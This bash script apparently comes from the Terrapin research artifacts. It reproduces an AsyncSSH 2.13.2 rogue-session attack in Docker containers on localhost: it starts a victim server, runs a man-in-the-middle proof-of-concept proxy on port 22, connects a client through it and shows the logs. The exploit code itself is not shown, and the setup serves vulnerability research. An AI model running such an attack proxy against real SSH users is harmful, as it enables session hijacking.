#!/bin/bash
bash ../impl/build.sh
bash ../pocs/build.sh

# Start AsyncSSH server on port 2222 to connect to
echo "[+] Starting AsyncSSH 2.13.2 server on port 2222"
# terrapin-artifacts/asyncssh-server:2.13.2 contains an additional user "attacker" internally (see simple_server.py)
docker run -d \
  --network host \
  --name terrapin-artifacts-server \
  terrapin-artifacts/asyncssh-server:2.13.2 --username victim --password secret -p 2222 > /dev/null 2>&1
echo "[+] Starting AsyncSSH rogue session attack proxy on port 22. Connection will be proxied to 127.0.0.1:2222"
# Start AsyncSSH rogue session attack PoC proxy
docker run -d \
  --network host \
  --name terrapin-artifacts-poc \
  terrapin-artifacts/asyncssh-rogue-extension-negotiation --server-ip 127.0.0.1 --server-port 2222 > /dev/null 2>&1

echo "[+] Connecting with AsyncSSH 2.13.2 client to 127.0.0.1:22 as user victim"
docker run \
  --network host \
  --name terrapin-artifacts-client \
  terrapin-artifacts/asyncssh-client:2.13.2 --username victim --password secret > /dev/null 2>&1

echo "[+] Stopping all containers"
docker stop terrapin-artifacts-server terrapin-artifacts-poc terrapin-artifacts-client > /dev/null 2>&1

# Output log files using less
docker logs terrapin-artifacts-server > terrapin-artifacts-server.log 2>&1
docker logs terrapin-artifacts-poc > terrapin-artifacts-poc.log 2>&1
docker logs terrapin-artifacts-client > terrapin-artifacts-client.log 2>&1
less terrapin-artifacts-server.log terrapin-artifacts-poc.log terrapin-artifacts-client.log
rm terrapin-artifacts-server.log terrapin-artifacts-poc.log terrapin-artifacts-client.log
docker rm terrapin-artifacts-server terrapin-artifacts-poc terrapin-artifacts-client > /dev/null 2>&1
